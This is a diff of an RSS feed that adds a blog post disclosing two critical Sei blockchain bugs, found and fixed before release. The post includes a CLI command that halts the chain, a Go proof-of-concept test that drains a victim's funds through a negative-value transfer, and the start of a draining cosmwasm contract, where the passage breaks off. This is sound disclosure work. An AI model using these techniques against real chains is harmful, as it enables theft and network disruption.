@@ -4,12 +4,432 @@
         <title>HN100 - Readable Contents</title>
         <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
         <description>Uses Readability to add bodies to the RSS feed</description>
-        <lastBuildDate>Mon, 17 Jun 2024 20:30:05 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 17 Jun 2024 21:30:03 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
         <item>
-            <title><![CDATA[Htmx 2.0.0 has been released (195 pts)]]></title>
+            <title><![CDATA[Sei pays out $2M bug bounty (125 pts)]]></title>
+            <link>https://usmannkhan.com/bug%20reports/2024/06/17/sei-bug-report.html</link>
+            <guid>40710201</guid>
+            <pubDate>Mon, 17 Jun 2024 19:49:10 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://usmannkhan.com/bug%20reports/2024/06/17/sei-bug-report.html">https://usmannkhan.com/bug%20reports/2024/06/17/sei-bug-report.html</a>, See on <a href="https://news.ycombinator.com/item?id=40710201">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div itemprop="articleBody">
+    <p>In April 2024, I found and reported two critical bugs to <a href="https://www.sei.io/">Sei Network</a> concerning their layer-1 blockchain. One of these issues impacted the chain’s availability, and the other its integrity. The Sei Foundation awarded me $75,000 and $2,000,000 respectively for these reports.</p>
+
+<p>Both issues were caught after the code had been audited, merged, and slated for release but <strong>before</strong> it was shipped to production. As a result, no funds were put at risk. If it had made it to mainnet, the funds at risk from issue 2 would have been the entire Sei token market cap, or about $1B USD mark to market.</p>
+
+<h2 id="issue-1">Issue 1</h2>
+
+<p>If exploited, the first issue would have caused the chain to halt.</p>
+
+<p>The Sei Network is a “Cosmos chain”, meaning it leverages the Cosmos SDK for its blockchain application and uses a tendermint fork (well, actually, Sei’s own fork of a fork) for consensus. Cosmos applications operate on blocks, which contain transactions, which further contain individual messages. Each of these messages triggers a state transition. The Cosmos SDK is written in Go.</p>
+
+<p>Cosmos uses go panics for error handling. Transaction runs out of gas? panic. Try to spend more coins than you have? panic. Invalid inputs? panic.</p>
+
+<p>To handle this, transactions are run within a <a href="https://docs.cosmos.network/main/learn/advanced/runtx_middleware">recovery loop</a> called the <code>RunTx recovery middleware</code>. When Cosmos processes a block of transactions, the flow is kind of like this (heavily simplified).</p>
+
+<div><pre><code><span>func</span> <span>ProcessBlock</span><span>(</span><span>chainState</span> <span>State</span><span>,</span> <span>curBlock</span> <span>Block</span><span>)</span> <span>{</span>
+    <span>state</span><span>.</span><span>StartBlock</span><span>(</span><span>curBlock</span><span>)</span>
+    <span>state</span><span>.</span><span>ProcessTxs</span><span>(</span><span>curBlock</span><span>)</span>
+    <span>state</span><span>.</span><span>EndBlock</span><span>(</span><span>curBlock</span><span>)</span>
+<span>}</span>
+
+<span>func</span> <span>(</span><span>s</span> <span>State</span><span>)</span> <span>StartBlock</span><span>(</span><span>curBlock</span> <span>Block</span><span>)</span> <span>{</span>
+    <span>for</span> <span>module</span> <span>:=</span> <span>s</span><span>.</span><span>GetModules</span><span>()</span> <span>{</span>
+        <span>module</span><span>.</span><span>StartBlock</span><span>(</span><span>curBlock</span><span>)</span>
+    <span>}</span>
+<span>}</span>
+
+<span>func</span> <span>(</span><span>s</span> <span>State</span><span>)</span> <span>ProcessTxs</span><span>(</span><span>curBlock</span> <span>Block</span><span>)</span> <span>error</span> <span>{</span>
+    <span>defer</span> <span>func</span><span>()</span> <span>{</span>
+        <span>if</span> <span>r</span> <span>:=</span> <span>recover</span><span>()</span> <span>{</span>
+            <span>return</span> <span>fmt</span><span>.</span><span>Errorf</span><span>(</span><span>"borked"</span><span>)</span>
+        <span>}</span>
+    <span>}</span>
+    <span>// process tx, panics are ok in this function</span>
+<span>}</span>
+
+<span>func</span> <span>(</span><span>s</span> <span>State</span><span>)</span> <span>EndBlock</span><span>(</span><span>curBlock</span> <span>Block</span><span>)</span> <span>{</span>
+    <span>for</span> <span>module</span> <span>:=</span> <span>s</span><span>.</span><span>GetModules</span><span>()</span> <span>{</span>
+        <span>module</span><span>.</span><span>EndBlock</span><span>(</span><span>curBlock</span><span>)</span>
+    <span>}</span>
+<span>}</span>
+</code></pre></div>
+
+<p>There’s some preprocessing to set up a block, transactions are safely processed within a recovery loop, and then there is some work to do at the end of a block. Every Cosmos <code>module</code> can specify its own start and end processing hooks too. These hooks are one type of <code>ABCI method</code>. Unfortunately, by default, ABCI methods are not run in a recovery loop. Woops! If you panic <em>there</em>, the program will simply crash.</p>
+
+<p>I first learned of this Cosmos footgun from Trail of Bits’ fantastic <code>building-secure-contracts</code> repo. ref: <a href="https://github.com/crytic/building-secure-contracts/tree/master/not-so-smart-contracts/cosmos/abci_panic">https://github.com/crytic/building-secure-contracts/tree/master/not-so-smart-contracts/cosmos/abci_panic</a></p>
+
+<p>Sei had a panic in one of its ABCI EndBlockers, which would have reliably halted the chain if the code was reached. Remediation would have required a hard fork.</p>
+
+<p>While looking through all of the ABCI hooks in the Sei codebase for reachable panics, one stood out to me: <a href="https://github.com/sei-protocol/sei-chain/blob/49eb8b3d205d4a73c5e2b2bb3a433f886279028b/x/evm/module.go#L232">https://github.com/sei-protocol/sei-chain/blob/49eb8b3d205d4a73c5e2b2bb3a433f886279028b/x/evm/module.go#L232</a></p>
+
+<div><pre><code><span>coinbaseAddress</span> <span>:=</span> <span>state</span><span>.</span><span>GetCoinbaseAddress</span><span>(</span><span>idx</span><span>)</span>
+<span>balance</span> <span>:=</span> <span>am</span><span>.</span><span>keeper</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>coinbaseAddress</span><span>,</span> <span>denom</span><span>)</span>
+<span>weiBalance</span> <span>:=</span> <span>am</span><span>.</span><span>keeper</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>GetWeiBalance</span><span>(</span><span>ctx</span><span>,</span> <span>coinbaseAddress</span><span>)</span>
+<span>if</span> <span>!</span><span>balance</span><span>.</span><span>Amount</span><span>.</span><span>IsZero</span><span>()</span> <span>||</span> <span>!</span><span>weiBalance</span><span>.</span><span>IsZero</span><span>()</span> <span>{</span>
+    <span>if</span> <span>err</span> <span>:=</span> <span>am</span><span>.</span><span>keeper</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>SendCoinsAndWei</span><span>(</span><span>ctx</span><span>,</span> <span>coinbaseAddress</span><span>,</span> <span>coinbase</span><span>,</span> <span>balance</span><span>.</span><span>Amount</span><span>,</span> <span>weiBalance</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
+        <span>panic</span><span>(</span><span>err</span><span>)</span>
+    <span>}</span>
+<span>}</span>
+</code></pre></div>
+
+<p>The above code, at the end of every block, goes through each transaction and tries to empty the “coinbase address” of any tokens. The way this is done is first the coinbase address’s balance is retrieved via a call to <code>GetBalance</code> and then this resulting balance is transferred out by a call to <code>SendCoinsAndWei</code>.</p>
+
+<p>What the coinbase address represents in Sei doesn’t matter here. What’s important is that it is a deterministic address, calculable in advance. The address is calculated as a function of a tx’s index in a block. So the first tx in a block always has a “coinbase address” of <code>sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv</code>, and so on.</p>
+
+<p>The mistake here stems from the fact that cosmos chains have a notion of locked and unlocked balances. The <code>GetBalance</code> function called above returns the total of locked+unlocked funds. If, for example, the coinbase address has 42sei of locked funds and 1000sei of unlocked funds, the <code>GetBalance</code> call will report a total balance of 1042sei. However, because we can only transfer unlocked funds, the <code>SendCoinsAndWei</code> call will return an error if we call it with any number greater than 1000ei. When <code>SendCoinsAndWei</code> is called with an amount of 1042 sei, it will return an error and then we will reach the call to panic.</p>
+
+<p>One way to end up with locked funds is via a vesting account. If, for example, I want to grant you one thousand tokens linearly over four years then I can create a vesting account and the unlocks are handled automatically by Cosmos. When creating a vesting account I can specify its address and any unused address will do. I don’t need the keys to it or anything.</p>
+
+<p>Now we have all the pieces needed to reach an ABCI panic:</p>
+
+<ul>
+  <li>Create a vesting account at the <code>sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv</code> address with some tokens.</li>
+  <li>Send an EVM tx to Sei to reach this code block.</li>
+</ul>
+
+<p>To create the vesting account all we have to do is run a command like  <code>seid tx vesting create-vesting-account sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv 1000000000000000usei 1800000000 --from my_account --fees 50000usei</code> from the seid CLI tool.</p>
+
+<p>Once this command is executed and the vulnerable code is run, the coinbase balance will be greater than zero but not entirely transferable. The call to <code>GetBalance</code> will return the sum of locked and unlocked tokens. Calling <code>SendCoinsAndWei</code> with this sum will return an error, and a panic will be triggered. The application will crash and the chain will halt.</p>
+
+<p>To fix the issue, the call to <code>GetBalance</code> was simply replaced with a call to <code>SpendableCoins</code>. Easy! For safety, later on the panic was removed entirely.</p>
+
+<p>Fix: <a href="https://github.com/sei-protocol/sei-chain/pull/1586/files#diff-115be1725cca6393185395215fba9c7f1150801c7111c60fd6a65720db7a8808">https://github.com/sei-protocol/sei-chain/pull/1586/files#diff-115be1725cca6393185395215fba9c7f1150801c7111c60fd6a65720db7a8808</a></p>
+
+<p>Timeline:</p>
+<ul>
+  <li>April 22, 2024: I create the report on Immunefi</li>
+  <li>April 23, 2024: The Sei team merge a PR fixing the bug</li>
+  <li>April 23, 2024: The Sei team confirm the report</li>
+  <li>April 24, 2024: The Sei team send payment of $75,000</li>
+</ul>
+
+<h2 id="issue-2">Issue 2</h2>
+
+<p>If exploited, the second issue would have allowed an attacker to freely transfer funds out of any account.</p>
+
+<p>When browsing through the fix commit and subsequent changes made as a result of the previous issue, I noticed some interesting code at the junction of Sei’s Cosmos and Geth modules.</p>
+
+<p>At this time the Sei team was just wrapping up their work on Sei V2. V2 introduced the EVM (Ethereum Virtual Machine) to Sei. Integrating the EVM into a system like Cosmos is a sensitive process. Neither of these systems were designed with the other’s compatibility in mind and trying to combine them is difficult. It’s easy to introduce subtle yet disastrous bugs to your blockchain when doing this.</p>
+
+<p>In the fix PR for the previous issue, an unrelated bug was also patched in the evm account balance handling code. Looking at this file, I noticed that <code>SubBalance</code> and <code>AddBalance</code> had provisions for negative numbers:</p>
+
+<div><pre><code><span>func</span> <span>(</span><span>s</span> <span>*</span><span>DBImpl</span><span>)</span> <span>SubBalance</span><span>(</span><span>evmAddr</span> <span>common</span><span>.</span><span>Address</span><span>,</span> <span>amt</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>,</span> <span>reason</span> <span>tracing</span><span>.</span><span>BalanceChangeReason</span><span>)</span> <span>{</span>
+	<span>s</span><span>.</span><span>k</span><span>.</span><span>PrepareReplayedAddr</span><span>(</span><span>s</span><span>.</span><span>ctx</span><span>,</span> <span>evmAddr</span><span>)</span>
+	<span>if</span> <span>amt</span><span>.</span><span>Sign</span><span>()</span> <span>==</span> <span>0</span> <span>{</span>
+		<span>return</span>
+	<span>}</span>
+	<span>if</span> <span>amt</span><span>.</span><span>Sign</span><span>()</span> <span>&lt;</span> <span>0</span> <span>{</span>
+		<span>s</span><span>.</span><span>AddBalance</span><span>(</span><span>evmAddr</span><span>,</span> <span>new</span><span>(</span><span>big</span><span>.</span><span>Int</span><span>)</span><span>.</span><span>Neg</span><span>(</span><span>amt</span><span>),</span> <span>reason</span><span>)</span>
+		<span>return</span>
+	<span>}</span>
+    <span>// ...</span>
+<span>}</span>
+</code></pre></div>
+
+<p>Subtracting -x Sei tokens from an account is just redirected to be the same as adding +x. Similarly, adding -x Sei tokens to an account is redirected to the code for subtracting +x.</p>
+
+<p>That’s interesting. I wonder, how are balance transfers handled in the EVM anyways?</p>
+
+<div><pre><code><span>// Transfer subtracts amount from sender and adds amount to recipient using the given Db</span>
+<span>func</span> <span>Transfer</span><span>(</span><span>db</span> <span>vm</span><span>.</span><span>StateDB</span><span>,</span> <span>sender</span><span>,</span> <span>recipient</span> <span>common</span><span>.</span><span>Address</span><span>,</span> <span>amount</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>)</span> <span>{</span>
+	<span>db</span><span>.</span><span>SubBalance</span><span>(</span><span>sender</span><span>,</span> <span>amount</span><span>,</span> <span>tracing</span><span>.</span><span>BalanceChangeTransfer</span><span>)</span>
+	<span>db</span><span>.</span><span>AddBalance</span><span>(</span><span>recipient</span><span>,</span> <span>amount</span><span>,</span> <span>tracing</span><span>.</span><span>BalanceChangeTransfer</span><span>)</span>
+<span>}</span>
+</code></pre></div>
+
+<p>If one could slip a negative amount into <code>Transfer</code>, they could siphon Sei <em>from</em> an account rather than transferring Sei <em>to</em> an account.</p>
+
+<p>What guards are there before we reach Transfer?</p>
+
+<div><pre><code><span>// CanTransfer checks whether there are enough funds in the address' account to make a transfer.</span>
+<span>// This does not take the necessary gas in to account to make the transfer valid.</span>
+<span>func</span> <span>CanTransfer</span><span>(</span><span>db</span> <span>vm</span><span>.</span><span>StateDB</span><span>,</span> <span>addr</span> <span>common</span><span>.</span><span>Address</span><span>,</span> <span>amount</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>)</span> <span>bool</span> <span>{</span>
+	<span>return</span> <span>db</span><span>.</span><span>GetBalance</span><span>(</span><span>addr</span><span>)</span><span>.</span><span>Cmp</span><span>(</span><span>amount</span><span>)</span> <span>&gt;=</span> <span>0</span>
+<span>}</span>
+</code></pre></div>
+
+<p>Looks like an account can make transfers as long as it has more than the <code>amount</code> being transferred. Looks good so far. Say I want to steal 100sei; I’d need to send a transfer of -100sei. Well, even a 0sei balance is more than -100sei. So for negative amounts this check will always pass.</p>
+
+<p>Of course, there may be even more checks prior to this. Or not. It’s a big codebase, I don’t know. Let’s just write the code and see what happens.</p>
+
+<p>In SeiV2 there are three high level ways to trigger this EVM transfer code:</p>
+<ul>
+  <li>From EVM space, use a <code>CALL</code>, <code>CREATE</code> or <code>SELFDESTRUCT</code> opcode</li>
+  <li>Send a top level EVM Message packaged in a transaction</li>
+  <li>From cosmwasm space, send an internal EVM message</li>
+</ul>
+
+<p>If any of these routes allow transfers of negative value then we will be able to steal the entire unlocked balance from any account.</p>
+
+<hr>
+<p>Right off the bat the first option will not work. The EVM uses 256 bit registers that we can set freely as opcode arguments but the state transition handling code for <code>CALL</code> and <code>CREATE</code> treat these as unsigned integers, so they are always positive. <code>SELFDESTRUCT</code> triggers transfers but doesn’t take a value argument.</p>
+
+<hr>
+<p>The second option seems promising. We only need to construct a <code>MsgEVMTransaction</code> with negative value. However, Sei’s <code>MsgEVMTransaction</code> type uses the RLP encoding from Geth for the data field, which itself includes the <code>value</code> field. <code>value</code> is typed as a big int, which is a signed type and can be negative! Unfortunately there is no valid RLP encoding for a negative big int: when encoding, the sign information is discarded. When decoding, the output is always positive.</p>
+
+<div><pre><code><span>// WriteBigInt encodes a big.Int as an RLP string.</span>
+<span>// Note: Unlike with Encode, the sign of i is ignored.</span>
+<span>func</span> <span>(</span><span>w</span> <span>EncoderBuffer</span><span>)</span> <span>WriteBigInt</span><span>(</span><span>i</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>)</span> <span>{</span>
+	<span>w</span><span>.</span><span>buf</span><span>.</span><span>writeBigInt</span><span>(</span><span>i</span><span>)</span>
+<span>}</span>
+</code></pre></div>
+<hr>
+<p>The third option uses yet another execution mode contained in Sei. Really Sei V2 has three modes of executing transactions:</p>
+<ul>
+  <li>Cosmos messages</li>
+  <li>cosmwasm</li>
+  <li>EVM</li>
+</ul>
+
+<p>Technically cosmwasm and EVM programs are both triggered by high level cosmos messages, but it’s worth considering them separately. Cosmos transactions contain messages that execute specific functions. For example a message might execute an action like “stake some coins” or “send some coins”. These functions are baked into the chain code and are not generally programmable by end users.</p>
+
+<p>The community found this a bit limiting, so to add more flexibility cosmwasm was introduced to bring a web assembly environment to Cosmos. This enabled general-purpose smart contract programming by end users.</p>
+
+<p>Finally, Sei V2 builds on both of these and adds a bespoke EVM environment to the mix. The way this is done is by linking to go-ethereum and adding hooks to connect the EVM state mutations to the underlying Cosmos system and storage.</p>
+
+<p>So now in addition to the fixed functions that can be called by messages, we also have the ability to specify messages that “create a cosmwasm or EVM program” or “execute a cosmwasm or EVM program”. The cosmwasm (web assembly) module is well tested and widely used. Sei’s EVM integration is custom, only used by Sei, and brand new.</p>
+
+<p>At the time of my report, a Cosmos message in Sei could bounce execution back and forth between these environments as much as it wants. One could, for example, send a transaction that contains a message to call a cosmwasm program, which then dispatches a cosmos message to send coins, receives its result and calls an EVM contract.</p>
+
+<p>Calling an EVM smart contract from cosmwasm in SeiV2 is slightly different from making a top-level EVM call directly. To make a cosmwasm -&gt; EVM call we use one of the following “internal” message types instead of <code>MsgEVMTransaction</code>.</p>
+
+<div><pre><code><span>type</span> <span>MsgInternalEVMCall</span> <span>struct</span> <span>{</span>
+	<span>Sender</span> <span>string</span>
+	<span>Value</span>  <span>*</span><span>github_com_cosmos_cosmos_sdk_types</span><span>.</span><span>Int</span>
+	<span>To</span>     <span>string</span>
+	<span>Data</span>   <span>[]</span><span>byte</span>
+<span>}</span>
+
+<span>type</span> <span>MsgInternalEVMDelegateCall</span> <span>struct</span> <span>{</span>
+	<span>Sender</span>       <span>string</span>
+	<span>CodeHash</span>     <span>[]</span><span>byte</span>
+	<span>To</span>           <span>string</span>
+	<span>Data</span>         <span>[]</span><span>byte</span>
+	<span>FromContract</span> <span>string</span>
+<span>}</span>
+</code></pre></div>
+
+<p>Remember, what we’re interested in is triggering a transfer with a negative <code>amount</code> or <code>value</code> (these terms are used interchangeably at times). Of these two internal call types, only <code>MsgInternalEVMCall</code> allows us to specify a value to go along with the call. And it’s a signed int!</p>
+
+<p>To find out whether or not I could successfully use <code>MsgInternalEVMCall</code> to make a siphoning transfer I added the following test to Sei’s test suite and ran it.</p>
+
+<div><pre><code><span>func</span> <span>TestNegativeTransfer</span><span>(</span><span>t</span> <span>*</span><span>testing</span><span>.</span><span>T</span><span>)</span> <span>{</span>
+	<span>steal_amount</span> <span>:=</span> <span>int64</span><span>(</span><span>1</span><span>_000_000_000_000</span><span>)</span>
+
+	<span>k</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>EvmKeeper</span>
+	<span>ctx</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>NewContext</span><span>(</span><span>false</span><span>,</span> <span>tmtypes</span><span>.</span><span>Header</span><span>{})</span><span>.</span><span>WithBlockHeight</span><span>(</span><span>2</span><span>)</span>
+	<span>attackerAddr</span><span>,</span> <span>attackerEvmAddr</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>MockAddressPair</span><span>()</span>
+	<span>victimAddr</span><span>,</span> <span>victimEvmAddr</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>MockAddressPair</span><span>()</span>
+
+	<span>// associate addrs</span>
+	<span>k</span><span>.</span><span>SetAddressMapping</span><span>(</span><span>ctx</span><span>,</span> <span>attackerAddr</span><span>,</span> <span>attackerEvmAddr</span><span>)</span>
+	<span>k</span><span>.</span><span>SetAddressMapping</span><span>(</span><span>ctx</span><span>,</span> <span>victimAddr</span><span>,</span> <span>victimEvmAddr</span><span>)</span>
+
+	<span>// mint some funds to victim</span>
+	<span>amt</span> <span>:=</span> <span>sdk</span><span>.</span><span>NewCoins</span><span>(</span><span>sdk</span><span>.</span><span>NewCoin</span><span>(</span><span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>),</span> <span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span><span>)))</span>
+	<span>require</span><span>.</span><span>Nil</span><span>(</span><span>t</span><span>,</span> <span>k</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>MintCoins</span><span>(</span><span>ctx</span><span>,</span> <span>types</span><span>.</span><span>ModuleName</span><span>,</span> <span>sdk</span><span>.</span><span>NewCoins</span><span>(</span><span>sdk</span><span>.</span><span>NewCoin</span><span>(</span><span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>),</span> <span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span><span>)))))</span>
+	<span>require</span><span>.</span><span>Nil</span><span>(</span><span>t</span><span>,</span> <span>k</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>SendCoinsFromModuleToAccount</span><span>(</span><span>ctx</span><span>,</span> <span>types</span><span>.</span><span>ModuleName</span><span>,</span> <span>victimAddr</span><span>,</span> <span>amt</span><span>))</span>
+
+	<span>// construct attack payload</span>
+	<span>val</span> <span>:=</span> <span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span><span>)</span><span>.</span><span>Mul</span><span>(</span><span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span> <span>*</span> <span>-</span><span>1</span><span>))</span>
+	<span>req</span> <span>:=</span> <span>&amp;</span><span>types</span><span>.</span><span>MsgInternalEVMCall</span><span>{</span>
+		<span>Sender</span><span>:</span> <span>attackerAddr</span><span>.</span><span>String</span><span>(),</span>
+		<span>Data</span><span>:</span>   <span>[]</span><span>byte</span><span>{},</span>
+		<span>Value</span><span>:</span>  <span>&amp;</span><span>val</span><span>,</span>
+		<span>To</span><span>:</span>     <span>victimEvmAddr</span><span>.</span><span>Hex</span><span>(),</span>
+	<span>}</span>
+
+	<span>// logging</span>
+	<span>preAttackerBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>attackerAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
+	<span>preVictimBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>victimAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
+	<span>t</span><span>.</span><span>Logf</span><span>(</span><span>"</span><span>\n</span><span>PRE ATTACK</span><span>\n</span><span>Attacker Bal: %d</span><span>\n</span><span>Victim Bal: %d</span><span>\n</span><span>------</span><span>\b</span><span>"</span><span>,</span> <span>preAttackerBal</span><span>,</span> <span>preVictimBal</span><span>)</span>
+
+	<span>// EXECUTE ATTACK</span>
+	<span>_</span><span>,</span> <span>err</span> <span>:=</span> <span>k</span><span>.</span><span>HandleInternalEVMCall</span><span>(</span><span>ctx</span><span>,</span> <span>req</span><span>)</span>
+	<span>require</span><span>.</span><span>Nil</span><span>(</span><span>t</span><span>,</span> <span>err</span><span>)</span>
+
+	<span>// post logging</span>
+	<span>postAttackerBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>attackerAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
+	<span>postVictimBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>victimAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
+	<span>t</span><span>.</span><span>Logf</span><span>(</span><span>"</span><span>\n</span><span>POST ATTACK</span><span>\n</span><span>Attacker Bal: %d</span><span>\n</span><span>Victim Bal: %d</span><span>\n</span><span>------</span><span>\b</span><span>"</span><span>,</span> <span>postAttackerBal</span><span>,</span> <span>postVictimBal</span><span>)</span>
+<span>}</span>
+</code></pre></div>
+
+<p>The output was:</p>
+
+<div><pre><code><span>$ </span>go <span>test</span> <span>-v</span> <span>-timeout</span> 30s <span>-run</span> <span>"^TestNegativeTransfer$"</span> github.com/sei-protocol/sei-chain/x/evm/keeper
+<span>===</span> RUN   TestNegativeTransfer
+    evm_test.go:67: 
+        PRE ATTACK
+        Attacker Bal: 0
+        Victim Bal: 1000000000000
+        <span>------</span>
+    evm_test.go:76: 
+        POST ATTACK
+        Attacker Bal: 1000000000000
+        Victim Bal: 0
+        <span>------</span>
+<span>---</span> PASS: TestNegativeTransfer <span>(</span>0.00s<span>)</span>
+PASS
+ok      github.com/sei-protocol/sei-chain/x/evm/keeper  0.215s
+</code></pre></div>
+
+<p>Sure enough, we can send an internal EVM call from an attacker account to a victim account with a negative value and siphon out that value from the victim’s balance.</p>
+
+<p>At this point all funds on the chain are at risk. An attacker could freely steal Sei tokens from centralized exchanges, cold wallets, etc. Given that Sei is trading at around a $1 billion market cap with &gt;$100M of daily volume between derivatives and spot, there is a lot of profit opportunity here.</p>
+
+<p>But for fun, we can take this bug even further.</p>
+
+<p>Cosmos chains operate on proof of stake consensus. For Sei, this means that the 50 validators with the most stake are responsible for producing and verifying new blocks on the chain. All 50 validators’ stakes are held in one account called the “bonded token pool”.</p>
+
+<p>An attacker can become the #1 most powerful validator on the chain by simply stealing the balance of the bonded token pool, and staking that sum again themselves. When they do this the tokens are returned to the same account they stole them from.  If you create 50 accounts, and do this 50 times, you will own all of the top 50 validators and control the chain. Because the active validator set is recalculated at the end of every block in an ABCI method, this whole attack can be done in one block.</p>
+
+<p>Under the tendermint consensus system, anyone with &gt;2/3rds stake can arbitrarily choose what blocks are canonical on the chain. At this point the chain is considered compromised and needs to be hard forked from before the attack. Some things the attacker can do include:</p>
+
+<ul>
+  <li>Censor anyone’s transactions. If someone tried to use this same exploit to steal coins back from the attacker, their transactions can be ignored and will never land in a block.</li>
+  <li>Commit invalid state transitions. The attacker can use their 2/3rds stake to attest to whatever blocks they want, including ones with arbitrary information and proofs in the block header.</li>
+  <li>Double spend coins.</li>
+</ul>
+
+<p>While the token theft mechanism is perfectly valid according to the chain’s code, certain types of faults like committing invalid blocks will be rejected by honest full nodes. These nodes will simply stop advancing their local chain in the face of a safety fault. But other attacks, like transaction censoring, are not detectable.</p>
+
+<p>Light clients that only check validator proofs, like those used in IBC, will accept any of the attacker blocks.</p>
+
+<p>Timeline:</p>
+<ul>
+  <li>April 23, 2024: I create the report on Immunefi</li>
+  <li>April 24, 2024: The Sei team merge a PR fixing the bug</li>
+  <li>April 24, 2024: The Sei team confirm the report</li>
+  <li>May 22, 2024: The Sei team send payment of $2,000,000</li>
+</ul>
+
+<p>I’d like to thank the Sei Foundation for their commendable efforts in securing the Sei protocol. It is only due to their thoroughness in designing Sei’s security strategy that these bugs were able to be caught before the vulnerable code was deployed to mainnet. The issues described here are subtle and persisted through Sei’s internal code review and several external audits. However Sei has gone above and beyond, putting a large amount of resources towards setting up a public bug bounty program in their pursuit of defense in depth. In rapidly addressing and honestly rewarding these reports, the Sei Foundation has demonstrated their absolute commitment to protecting their users.</p>
+
+<h2 id="appendix">Appendix</h2>
+
+<p>Particularly attentive readers might notice that the test I added to confirm issue 2 is not actually an end to end proof of concept.</p>
+
+<p>In the test I constructed a <code>MsgInternalEVMCall</code> directly. But in a real attack scenario we would have to create a cosmwasm contract compiled to webassembly, populate this struct from there, serialize it to JSON, and send it as a submessage from cosmwasm back to the main cosmos application which would construct the <code>MsgInternalEVMCall</code> for us.</p>
+
+<p>These two scenarios are not identical. The JSON-&gt;Msg encoder and handler functions are both custom written by the Sei team and were skipped in my test. It is reasonable to wonder whether or not there they contain additional guards that might prevent the attack but were skipped in the test I made.</p>
+
+<p>When submitting my report to Sei I was very confident that there were no such guards, as I had read all of the code many times at that point and knew it inside and out. But eventually I wanted to test stealing tokens from the bonded validator pool to take over the validator set. I ended up making a proper end to end proof of concept because I wasn’t sure whether or not the bonded token pool had any special status as an account, potentially with some sort of lock on its tokens, and wanted to test this.</p>
+
+<p>The following cosmwasm contract exploits the bug and drains the bonded token pool.</p>
+<div><pre><code><span>#[cfg(not(feature</span> <span>=</span> <span>"library"</span><span>))]</span>
+<span>use</span> <span>cosmwasm_std</span><span>::</span><span>entry_point</span><span>;</span>
+<span>use</span> <span>cosmwasm_std</span><span>::{</span>
+    <span>BalanceResponse</span><span>,</span> <span>BankQuery</span><span>,</span> <span>CosmosMsg</span><span>,</span> <span>DepsMut</span><span>,</span> <span>Env</span><span>,</span> <span>Int256</span><span>,</span> <span>MessageInfo</span><span>,</span> <span>Reply</span><span>,</span> <span>Response</span><span>,</span> <span>StdError</span><span>,</span> <span>StdResult</span><span>,</span> <span>SubMsg</span><span>,</span> <span>CustomMsg</span>
+<span>};</span>
+<span>use</span> <span>cw_storage_plus</span><span>::</span><span>Item</span><span>;</span>
+<span>use</span> <span>crate</span><span>::</span><span>msg</span><span>::</span><span>InstantiateMsg</span><span>;</span>
+<span>use</span> <span>cosmwasm_schema</span><span>::</span><span>cw_serde</span><span>;</span>
+<span>use</span> <span>serde</span><span>::{</span><span>Deserialize</span><span>,</span> <span>Serialize</span><span>};</span>
+<span>use</span> <span>schemars</span><span>::</span><span>JsonSchema</span><span>;</span>
+
+<span>#[cfg_attr(not(feature</span> <span>=</span> <span>"library"</span><span>),</span> <span>entry_point)]</span>
+<span>pub</span> <span>fn</span> <span>instantiate</span><span>(</span>
+    <span>_deps</span><span>:</span> <span>DepsMut</span><span>,</span>
+    <span>_env</span><span>:</span> <span>Env</span><span>,</span>
